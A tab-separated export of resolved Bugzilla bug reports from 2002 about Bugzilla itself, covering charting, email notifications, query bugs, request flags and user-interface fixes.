178043%TAB%1036219426%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%In graphical reports, provide mechanism for user to tweak presentation of report%TAB%In graphical reports, provide mechanism for user to tweak presentation of reportIn initially using the graphical reports, feature, many of the charts are a few tweaks away from being ready to publish.  GD::Graph has a huge set of options available that impact the presentation that may need to be tweakable on a per-chart basis.  Among those are....  x_labels_vertical show_values supress_angle  and the list goes on....  Ideally, we should be able to keep the existing behavior, but permit a user to tweak-and-redisplay (in as generalized a manner as possible) a wide set of GD options.  Continuing on the "ideal" wish-list, we should be able to either bookmark the settings with the query or store the settings in a way that they can be applied to any query.
178153%TAB%1036293567%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Changing 1199 bugs took 75 minutes%TAB%Changing 1199 bugs took 75 minutesell um. i just tried to kill off UID. (I failed; there are 13 bugs i can't see.) I'm filing this bug to complain about how long it took for me to move 1200 bugs :-)  steps: collect one very large useless component 'uid'. collect ~1200 resolved bugs (resolution!=---). query for all bugs (that you can see...) in the component select change several bugs at once check all select a new component (i used browser-general).  Here's the first bugmail i got: Date: Sun, 3 Nov 2002 02:33:02 -0800 (PST) Message-Id: <200211031033.gA3AX2w13629@mothra.mozilla.org> From: bugzilla-daemon@mozilla.org To: timeless@myrealbox.com Subject: [Bug 130580] Following link and then "Back"ing displays previous page at top. X-Bugzilla-Reason: AssignedTo QAContact  http://bugzilla.mozilla.org/show_bug.cgi?id=130580  timeless@bemail.org changed:             What    |Removed                     |Added ----------------------------------------------------------------------------           Component|User Interface Design       |Browser-General  And the last one: Date: Sun, 3 Nov 2002 03:47:50 -0800 (PST) Message-Id: <200211031147.gA3BloW10980@mothra.mozilla.org> From: bugzilla-daemon@mozilla.org To: timeless@myrealbox.com Subject: [Bug 49201] Print button should be hidden by default X-Bugzilla-Reason: AssignedTo QAContact CC 
178157%TAB%1036296468%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Dependancy emails don't get sent for status change during mass change,Dependency emails don't get sent for status change during mass change%TAB%Dependancy emails don't get sent for status change during mass change,Dependency emails don't get sent for status change during mass changeWe send dependancy mails based on the incorrectly named 'dependencychanged' hash in process_bug. This seems to be reading from the form value, and then later ading any change values. For mass changes, the form value will be blank, and there will be no changes, so the hash is empy, and processmail isn't called on mass resolves.  The info is sent the next time mail happens on the bug, for whatever reason.
178162%TAB%1036301959%TAB%33168%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Accounts%TAB%vote check box should appear on left%TAB%vote check box should appear on leftIf you have a bug with a long message on your bug list, the checkbox will be far away. It makes it difficult to find out to which bug a box is associated.  E.g. when bug 58229 was not fixed, it created a very long line. http://bugzilla.mozilla.org/show_bug.cgi?id=58339 The vote checkbox should be on the left side, close to the bux number. Thus it is easy to see it whatever the length of the bug description is.
178178%TAB%1036317492%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%Sidebar name should not be hardcoded to "Bugzilla"%TAB%Sidebar name should not be hardcoded to "Bugzilla"When a bugzilla instance adds itself to the Sidebar, It always calls itself "Bugzilla"   This makes the sidebar useless for anyone who has more than one Bugzilla site.  It is not obvious how to change this.  The obvious template hacks do not seem to effect it.
178230%TAB%1036352093%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Update documentation for Enterprise Groups%TAB%Update documentation for Enterprise GroupsThis will be the parent bug for documentation changes related to enterprise group support.  This includes....  > 55 (hierarchichal) groups. Rearchitected product groups. Private comments and attachments
178370%TAB%1036430147%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Email Notifications%TAB%global pref for whether or not to send mail,global param for whether or not to send mail%TAB%global pref for whether or not to send mail,global param for whether or not to send mailThere should be a global preference for whether or not to send mail, and no mail should be sent by a Bugzilla script for any reason if the pref is turned off.  This is particularly useful for test installations using real data where you don't want real users getting fake emails when you make fake changes to the test data.
178383%TAB%1036437393%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%query conditions appear twice,product/component query conditions appear twice%TAB%query conditions appear twice,product/component query conditions appear twiceThere are actually two separate bugs here:      if ($params->param('product')) {         push(@supptables, "products products_");         push(@wherepart, "products_.id = bugs.product_id");         push(@specialchart, ["products_.name", "anyexact",                              join(',',$params->param('product'))]);     }  we can drop the @wherepart push, since the specialchart stuff will set that up below (actually, it does |bugs.product_id = products_.id|, ie the other way arround. Thats just cosmetic)  The other bug is that the (products_.name = "FOO") stuff is duplicated. Off the top of my head, I'm not sure why that happens.
178624%TAB%1036548646%TAB%74065%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Documentation%TAB%can't make template customisation work,template customisation documentation does not tell to run checksetup.pl%TAB%can't make template customisation work,template customisation documentation does not tell to run checksetup.plcan't make template customisation work,  template customisation documentation does not tell to run checksetup.pl
178772%TAB%1036602325%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%doeditparams.cgi failed with malformed headers%TAB%doeditparams.cgi failed with malformed headersdoeditparams.cgi fails on the trunk with a server error after I edit params and then submit my changes.  The Apache log says:  [Wed Nov  6 17:56:36 2002] [error] [client 64.236.139.249] malformed header from script. Bad header=We don't have shadow databases: /opt/webtools/bugzilla-test/doeditparams.cgi  "We don't have shadow databases" appears in syncshadowdb, which is somehow being called first, even though doeditparams.cgi returns HTTP headers before it does almost everything.
178776%TAB%1036602863%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%warning in duplicates report%TAB%warning in duplicates reportduplicates.cgi warns of the nonexistence of the ctype form parameter on line 40.
178794%TAB%1036611747%TAB%9757%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%Request Queue has Internal Server Error if accessed when not logged in%TAB%Request Queue has Internal Server Error if accessed when not logged inIf you try to access a Request Queue URL when not logged in, you get an Internal Server Error.
178800%TAB%1036614640%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Graphical Charts fail with taint error with perl 5.6.0%TAB%Graphical Charts fail with taint error with perl 5.6.0On sites with 5.6.0 (mothra), queries for graphical charts such as severity versus status are tainted.  This is most likely due to taints being propagated through   my @selectnames = map($columns{$_}, @axis_fields); in report.cgi
178801%TAB%1036614883%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%missing &:: in Search.pm%TAB%missing &:: in Search.pmUndefined subroutine &Bugzilla::Search::ThrowCodeError called at Bugzilla/Search.pm line 855.
178841%TAB%1036647664%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%file name field must *not* include full windows paths%TAB%file name field must *not* include full windows pathsC:\WINNT\Profiles\pschwartau\Desktop\169707_TALKBACK.txt Attachment Type Created Flags Actions Talkback stack traces (2) text/plain 2002-09-20 14:37:32 none Edit  ------- Additional Comment #6 From Phil Schwartau 2002-09-20 14:41 -------  The stack traces both show crashes in the MRJ plug-in. Reassigning to Patrick and OJI component -  sorry phil, it was a random attachment number (generated by zeroing)
178877%TAB%1036654989%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Attachments & Requests%TAB%don't allow breaks around requestee field%TAB%don't allow breaks around requestee fieldThe requestee field in "edit attachment" and probably also "show bug" shouldn't allow breaks between the field itself and the parentheses around it.  Otherwise long flag types and user nicknames could cause the field to wrap after the opening parenthesis and before the closing parenthesis.
178880%TAB%1036655671%TAB%45949%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Bug Creation Date doesn't get displayed in long list%TAB%Bug Creation Date doesn't get displayed in long listWhen you make a query and then click on the long list-Button, there is no Bug Creation Date (in Bugzilla it is for example "Opened: 2002-10-20 02:42") displayed (it should be above the <hr>-line and Comment 0 in the bug, on the right side of the page).
178935%TAB%1036670493%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%edit users/add users shouldn't include a link to http://bugzilla.mozilla.org/editusers.cgi?action=add if the permission flag isn't set%TAB%edit users/add users shouldn't include a link to http://bugzilla.mozilla.org/editusers.cgi?action=add if the permission flag isn't setSelect match string   List users with login name matching:  Back to the index or Add a new user.  -- clicking add a new user: Add user   Sorry, you don't have permissions to add new users.  Back to the index or Add a new user. -- ^ this is really clever
178984%TAB%1036684475%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%flag requestee field should be disabled unless flag is requested%TAB%flag requestee field should be disabled unless flag is requestedThe flag requestee field is enabled all the time, even when a flag isn't being requested.  It should be disabled until someone requests the flag (i.e. changes the pull-down menu to "?").
179174%TAB%1036804857%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Need to fix use of $| (for buffering)%TAB%Need to fix use of $| (for buffering)This just sets $| - I'll file a new bug on the other stuff, which isn't so urgent.
179177%TAB%1036805640%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%keywords and dependencies tables aren't locked when creating bug%TAB%keywords and dependencies tables aren't locked when creating bugkeywords and dependencies can be added to a new bug, but those tables aren't locked beforehand, although this is necessary to prevent a server error if an installation is using the shadow database.  the fielddefs table also has to be locked, as it's used by the dependency insertion code.
179184%TAB%1036806913%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%regetlastlist returns all bugs%TAB%regetlastlist returns all bugsregetlastlist changes $::buffer, but then the params object is created from $cgi.  Quick fix - change  my $params = new Bugzilla::CGI($cgi);  to use $::buffer instead  Better fix is to rearrange code a bit; pathc coming
179188%TAB%1036807795%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Email Notifications%TAB%New flag system doesn't tell you what the flag was set on in bugmail%TAB%New flag system doesn't tell you what the flag was set on in bugmailIn the old system it said "Attachment #xxxx Status" for the attachment statuses.
179189%TAB%1036808284%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%When filing a new bug, the generated bugmail doesn't include Product,When filing a new bug, the generated bugmail doesn't include Product/Component%TAB%When filing a new bug, the generated bugmail doesn't include Product,When filing a new bug, the generated bugmail doesn't include Product/ComponentWhats happening is that processmail is using log_columns, but product isn't in there, only product_id.
179193%TAB%1036811261%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%anyexact should use IN, not OR%TAB%anyexact should use IN, not ORmysql optimises |foo IN (a,b,.....)| into a binary search. For OR, it tests each one individually.  For the set of 'all duplicates in bugzilla', the difference between the two for 5 runs (of duplicates.cgi, see the patch on bug 176599) is 1min 3 sec vs 8 seconds. OK, this is probably several thousand bugs, but still...  I'm going to attach a patch which fixes this.  I know that pg barfs when it gets severl thousand things in an IF; if dkl can come up with a ballpark numebr, we can split this into multiple INs.
179198%TAB%1036812460%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%Don't print labels for pie chart wedges when smaller than a certain size%TAB%Don't print labels for pie chart wedges when smaller than a certain sizeDon't print labels for pie chart wedges when smaller than a certain size
179203%TAB%1036813893%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%"Preset Queries" text does not appear in footer if last named query is not in footer%TAB%"Preset Queries" text does not appear in footer if last named query is not in footerIF you have some named queries which aren't in the footer, and one of those ouwld belast in the list, then we get the 'are there any preset queries' logic wrong  We have:      [% preset_queries = user.showmybugslink %]     [% FOREACH q = user.queries %]       [% preset_queries = 1 IF q.linkinfooter %]     [% END %]  which parses as   [% preset_queries = (1 IF q.linkinfooter) %]
179205%TAB%1036815024%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%flag options incorrect%TAB%flag options incorrectFlag options don't match what their type configuration says they should be.  In particular, active plussed flags look inactive and unrequestable flags show a "?".
179206%TAB%1036815170%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%enter_bug isn't picking up version from URL%TAB%enter_bug isn't picking up version from URLThe URL above, for me, still fills in the version as "unspecified".
179207%TAB%1036815258%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%Blessing doesn't work right%TAB%Blessing doesn't work rightAccording to userprefs.cgi, I can bless only canconfirm and editbugs. However, I just tested, and I can bless other groups as well. This could be because I've got a fair number of admin privs - so either the userprefs should notice and say "You can bless anyone", or blessing is broken.
179225%TAB%1036825770%TAB%29447%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Missing space.   "Reassign bug to ownerand QA contact of selected component "%TAB%Missing space.   "Reassign bug to ownerand QA contact of selected component "Missing space.   "Reassign bug to ownerand QA contact of selected component "
179238%TAB%1036830158%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Server Operations,Query/Bug List%TAB%Searching by commenter (longdesc) is ignored if you do "exact" or "contains"%TAB%Searching by commenter (longdesc) is ignored if you do "exact" or "contains""searching by commenter (longdesc) seems to be ignored if you do "exact" or "contains".  "matches regexp" seems to work."
179242%TAB%1036831493%TAB%19073%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Searching for comment contains string + email gives "Not unique table/alias: 'longdescs_' at globals.pl line 242"%TAB%Searching for comment contains string + email gives "Not unique table/alias: 'longdescs_' at globals.pl line 242"e.g. set "comment contains string" to "history", email commenter is "moz@compsoc.man.ac.uk" :
179260%TAB%1036839321%TAB%38080%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Unknown table 'map_assigned_to' in order clause at globals.pl line 242%TAB%Unknown table 'map_assigned_to' in order clause at globals.pl line 242User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2b) Gecko/20020618 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2b) Gecko/20020618  Any bugzilla query will do this URL: http://bugzilla.mozilla.org/buglist.cgi?bug_status=UNCONFIRMED&bug_status=NEW&bug_status=ASSIGNED&bug_status=REOPENED&field0-0-0=product&type0-0-0=substring&value0-0-0=test&field0-0-1=component&type0-0-1=substring&value0-0-1=test&field0-0-2=short_desc&type0-0-2=substring&value0-0-2=test&field0-0-3=status_whiteboard&type0-0-3=substring&value0-0-3=test  Cookies: LASTORDER=bugs.delta_ts%2C%20bugs.bug_status%2C%20bugs.priority%2C%20map_assigned_to.login_name%2C%20bugs.bug_id COLUMNLIST=opendate changeddate severity priority platform status resolution component votes target_milestone summaryfull  Doesn't do this in other browsers, so I'm guessing it's cookies.. possibly the fact I sort by assigned_to, but do not have it in the column list?  Reproducible: Always
179264%TAB%1036840858%TAB%45949%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%csv output for the buglist (see url inside) is invalid (too many "s and ),csv output for the buglist (see url inside) is invalid (too many "s)%TAB%csv output for the buglist (see url inside) is invalid (too many "s and ),csv output for the buglist (see url inside) is invalid (too many "s)it doesn't follow the rules for "s, when you store the file as CSV; it makes in  HTML 178933 nor -- PC justdave@netscape.com NEW create user error includes "Content- type: text/html"  and in CSV it gets 178933,normal,--,PC,justdave@netscape.com,NEW,,create user  error includes ""Content-type: text/html",  You see, in HTML it is 2 "s and in CSV it is 3 "s. But thats wrong because the   http://www.creativyst.com/Doc/Articles/CSV/CSV01.htm lists the rules as:  #A field that contains double quote characters must be surounded by double-  #quotes, and the embedded double-quotes must each be represented by a pair of   #consecutive double quotes.  the other rule the csv output probably breaks is:
179284%TAB%1036849053%TAB%15661%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%attachment flag change mails with ? should show who the requestee is%TAB%attachment flag change mails with ? should show who the requestee isattachment flag change mails with ? should show who the requestee is
179290%TAB%1036852513%TAB%37326%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%login cookie not read,login cookie email needs to be escaped%TAB%login cookie not read,login cookie email needs to be escapedUser-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1) Gecko/20020912 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1) Gecko/20020912  Bugzilla is not remembering my login information from page to page. It has set cookies in my brower, but they aren't having any effect.  Reproducible: Always  Steps to Reproduce: 1. go to http://bugzilla.mozilla.org/ 2. follow the "Log in to an existing account" link 3. login; you are then brought to the query page 4. Follow the "Query" link at the bottom of the page (query.cgi) Actual Results:   Looking at the bottom of the page, you'll note that you're not logged in anymore.  Expected Results:   It should have read my cookie and kept my login.  This happens for *any* page.  For instance, I can be viewing a bug, attach a comment (it asks for my login information), try to add another comment, and it re-asks for my login info.
179292%TAB%1036852967%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%request queue always shows empty 'none' table%TAB%request queue always shows empty 'none' tableThis is proably a regression from bug 171480, although its not a bmo-regression since RT is new.  The table for the 'none' section is always showing up in the request queue. The above url link shows this happening with product/component (which should never be empty), although it happens in all cases I could find, as long as at least one request in total was found.  The table should only be printed if there are going to be entries for it.
179293%TAB%1036853369%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%time tracking js should only appear if time tracking is enabled%TAB%time tracking js should only appear if time tracking is enabledenter_bug sends the inline js all the time; it should only do so if the appropriate param is set
179302%TAB%1036856575%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%'anyexact' isn;t an option for boolean charts,'anyexact' isn't an option for boolean charts%TAB%'anyexact' isn;t an option for boolean charts,'anyexact' isn't an option for boolean chartsThe 'anyexact' query type doesn't appear to be accessible from boolean charts. It works if you hack the html, and I can't see why we'd want to disallow it.
179321%TAB%1036867303%TAB%19073%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%cannot clear status whiteboard entirely%TAB%cannot clear status whiteboard entirelyand attempt to entirely clear the Status Whiteboard, and commit. The change seems to be accepted, but if you revisit the bug, the status whiteboard still has the old value.  You /can/ change the value (that's where "test" came from) but clearing it entirely does not work.  Bradley Baetz (:bbaetz) Assignee
179328%TAB%1036871784%TAB%70327%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Irrelevant wording in report explanation,Mozilla-specific wording in duplicates.cgi explanation text%TAB%Irrelevant wording in report explanation,Mozilla-specific wording in duplicates.cgi explanation textUser-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461) Build Identifier: 2.16.1  Report explanation at  http://bugzilla.mozilla.org/duplicates.cgi#explanation  directly mentions Mozilla.  Not good for generic Bugzilla installation.  Reproducible: Always  Steps to Reproduce: (not applicable) Actual Results:   "The Most Frequent Bugs page lists the known open bugs which are reported most  frequently in recent builds of Mozilla. It is automatically generated from the  Bugzilla database every 24 hours, by counting the number of direct and indirect  duplicates of bugs."
179329%TAB%1036871817%TAB%40395%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%HTML-unsafe characters need to be escaped,HTML-unsafe characters need to be escaped in quips%TAB%HTML-unsafe characters need to be escaped,HTML-unsafe characters need to be escaped in quipsUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2b) Gecko/20021108 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.2b) Gecko/20021108  Somebody included <i> in a quip on this page so the second half of the page is italicized.  Reproducible: Always  Steps to Reproduce: 1. Look at the sample page code/rendering. Actual Results:   The bracket characters are not escaped.  Expected Results:   The bracket characters need to be escaped.  This is a potential security issue since somebody could add some unauthorized javascript.  I am making this critical for that reason.
179339%TAB%1036892087%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Simplify and improve the stored query mechanism%TAB%Simplify and improve the stored query mechanismSeveral things (e.g. bug 179281) have suggested to me that the UI associated with named queries needs an overhaul. Here are my suggestions. The aims of this change are as follows:  - Simplify the UI on the search page - Reduce the number of links in the footer, which gets bloated with lots of   queries - Make manipulating stored queries easier to understand - Avoid making them harder to use for an expert  As now, we need to be able to create them, run them, load them and forget them.  Creating and deleting them happens on buglist.cgi, at the bottom of the page:  ( Remember ) this search as: [         ] or instead, if you've just run a stored query: _Forget_ | _Edit_ this search "AssignedToMe"  Running them is always done from a dropdown list in the footer:  ... | ( Find ) bug # [      ] | ( Run ) search [ AssignedToMe |V] | ...  If JS is turned on, the search runs when you choose an option from the list, and Run is not a button.  The word "search" could be hyperlinked, replacing the current "Query" link, if that wasn't thought too confusing. The "edit" links would be a dropdown too.  query.cgi's knob would then be vastly simplified to:  ( Search )    [ ] and remember these as my default search options  Other changes: "My Bugs" becomes a default entry in the stored queries table, inserted at account creation time, instead of being hard-coded.  All queries appear in the footer, the links toolbar, and nowhere else, so linkinfooter goes away, along with its UI on userprefs.cgi.  Results: - No loss of function - Confusion about doing an action _and_ running the search is avoided - Queries are as easy to run as before (one click with JS) - Footer is simpler - Search page knob is much simpler - User preferences are simpler - Admin config is a bit simpler (mybugslink goes) - You can refine a search, and then remember it on the results page when it's   correct 
179351%TAB%1036905585%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%Oddly formatted emails from BMO,Oddly formatted emails from BMO (when marking as blocking and resolving in a single commit ?),Oddly formatted dependency emails from BMO,Oddly formatted dependency emails%TAB%Oddly formatted emails from BMO,Oddly formatted emails from BMO (when marking as blocking and resolving in a single commit ?),Oddly formatted dependency emails from BMO,Oddly formatted dependency emailsOddly formatted emails from BMO,  Oddly formatted emails from BMO (when marking as blocking and resolving in a single commit ?),  Oddly formatted dependency emails from BMO,  Oddly formatted dependency emails
179360%TAB%1036914350%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests%TAB%request.cgi: "Filter the Queue" should come before "Request Queue"%TAB%request.cgi: "Filter the Queue" should come before "Request Queue"The list of requests, presently rather short, is likely to become rather large. Therefore It would be better to have the "Filter the Queue" so one can fast select the filters and click "Filter" instead of waiting until all requests have been loaded and then to scroll all the way down.
179380%TAB%1036929023%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla-General%TAB%If 'usequips' is disabled, quips.cgi shouldn't work,If 'enablequips' is off, quips.cgi shouldn't work%TAB%If 'usequips' is disabled, quips.cgi shouldn't work,If 'enablequips' is off, quips.cgi shouldn't workIf 'usequips' is disabled, quips.cgi shouldn't work,  If 'enablequips' is off, quips.cgi shouldn't work
179451%TAB%1036965613%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Move order-by generation from buglist.cgi into search.pm%TAB%Move order-by generation from buglist.cgi into search.pmCurrent approach to generation of order-by is a hack.  See bug 179260.  buglist should pass its desired ordering to search.pm and have the query written at once.
179462%TAB%1036971242%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Query/Bug List%TAB%Quips do not display on buglists when enablequips is off,Clarify description for enablequips param%TAB%Quips do not display on buglists when enablequips is off,Clarify description for enablequips parameditparams.cgi says:  "enablequips: If this is on, Bugzilla displays a silly quip at the beginning of  buglists, and lets users add to the list of quips. If this is frozen, Bugzilla will display the quip but not permit new additions."  On b.m.o., this is currently off, but no quips are displayed. So either the text is wrong, or the quip system is broken.
179477%TAB%1036981331%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Attachments & Requests%TAB%make it possible to change the requestee for a request%TAB%make it possible to change the requestee for a requestIt should be possible to change the requestee for a request without having to clear the request, submit a form, and then go back and create a new request.
179483%TAB%1036985876%TAB%64379%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Displays wrong product name in question of bug entry template for Chimera or Bugzilla%TAB%Displays wrong product name in question of bug entry template for Chimera or BugzillaUser-Agent:       Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.0.1) Gecko/20021104 Chimera/0.6 Build Identifier: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.0.1) Gecko/20021104 Chimera/0.6  Section labelled Expected Results asks "What should Mozilla have done instead?". The question is inappropriate especially being that the top of the form says clearly that the Product is either Bugzilla or Mozilla embedded in the page code.  Reproducible: Always  Steps to Reproduce: 1. Enter non-Mozilla bug report in bugilla.mozilla.org tracked components. 2. Scroll down to Expected Results.. 3. Tadah!  Actual Results:   Always squawks "What should Mozilla have done instead" like a parrot..   Expected Results:   Bugzilla should ask "What should (product name) have done instead?" --nobrainer.   Here is the section of bug entry template that needs to be fixed in both cases:     <tr>     <td valign="middle" align="right">       <b>Expected Results</b>      </td>     <td valign="top">       <p>         What should Mozilla have done instead?       </p>       <textarea rows="4" cols="80" name="expected_results"                  wrap="hard"></textarea>     </td>   </tr>  Since there is already a different template for each product, it doesn't make sense that this item wasn't changed to match the name of each product.  It will take little work at all to patch this, just some minor text edits and ftp up the patched pages to the Bugilla mothership!
179491%TAB%1036999644%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Searchs of attchamnets containing a string do not enforce attchment privacy,Searchs of attchaments containing a string do not enforce attchment privacy,Searchs of attachments containing a string do not enforce attchment privacy,Search involving attachments do not enforce attchment privacy%TAB%Searchs of attchamnets containing a string do not enforce attchment privacy,Searchs of attchaments containing a string do not enforce attchment privacy,Searchs of attachments containing a string do not enforce attchment privacy,Search involving attachments do not enforce attchment privacySearchs of attchamnets containing a string do not enforce attchment privacy,  Searchs of attchaments containing a string do not enforce attchment privacy,  Searchs of attachments containing a string do not enforce attchment privacy,  Search involving attachments do not enforce attchment privacy
179494%TAB%1037000562%TAB%15661%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Attachments & Requests%TAB%requesting super-review didn't work well%TAB%requesting super-review didn't work well<biesi> myk: could you take a look at bug 102848, looks like bugzilla did soemthing wrong there...  <biesi> myk: the patch had review+ from ducarroz, I wanted to request superreview from bienvenu...  <biesi> myk: also, the process_bug page told me that no mail was sent when I added the superreview? status, shouldn't at least the requestee have got mail?  <biesi> myk: in addition, bugzilla mailed me: "Christian Biesinger <cbiesinger@web.de> has approved your request for review" wtf?  additionally, the requests.cgi page now shows two requests for the same status on the same attachment.
179510%TAB%1037006793%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests%TAB%Requext notofications dont take group restrictions fully into account,Request notofications dont take group restrictions fully into account,Request notifications dont take group restrictions fully into account%TAB%Requext notofications dont take group restrictions fully into account,Request notofications dont take group restrictions fully into account,Request notifications dont take group restrictions fully into accountWhen a security bug (or a private attachment) is flagged with a request and that request is copied automatically to a list (such as review requests going to reviewers), the notification of the request does not take into account the privileges of the recipient.  To further complicate things, the requestee may not have access to the very thing they are being requested to act upon.
179514%TAB%1037007558%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%CSV output should use consistent date/time format%TAB%CSV output should use consistent date/time formatWhen a buglist is requested in CSV format, it is presumably for further machine-based processing.  Rather than listing dates such as ....  9:15:54 7/29/2002 10/16/2002 3:42:29 Sat 08:39 8/5/2002  It should use a consistent format recognizable as a date...  probably...  yyyy-mm-dd hh:mm:ss  which seems to be a good way to dodge the  d/m/y versus m/d/y i10n issue.  [note - I DID mark this trivial]
179626%TAB%1037039077%TAB%20209%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%confusing presense of requestee's name when +/- selected as attachment flag,confusing presence of requestee's name when +/- selected as attachment flag,Hide, rather than disable, requestee fields when the flags aren't in the "?" state%TAB%confusing presense of requestee's name when +/- selected as attachment flag,confusing presence of requestee's name when +/- selected as attachment flag,Hide, rather than disable, requestee fields when the flags aren't in the "?" stateSTEPS TO REPRODUCE:  1) Load "Edit an attachment" page 2) Request a review from someone (set the review flag to '?') 3) Submit form 4) Load the same page again 5) Set the review flag to '+'  ACTUAL RESULTS:  The "requestee" textfield becomes disabled but makes it look                  like the review will be marked as being done by the requestee EXPECTED RESULTS: The "requestee" textfield should be completely blanked out or                   hidden to make it clear that it is irrelevant.  Boris Zbarsky [:bzbarsky] Reporter
179638%TAB%1037044935%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Email Notifications%TAB%Security group inclusion isn't indicated on "New:" notification%TAB%Security group inclusion isn't indicated on "New:" notificationBugmails have never indicated group settings. 
179671%TAB%1037065577%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Boolean charts are broken on reporting pages%TAB%Boolean charts are broken on reporting pages- There's no list of fields - Asking for AND or OR submits to report.cgi, which doesn't understand it, and so throws the error "no axes defined".
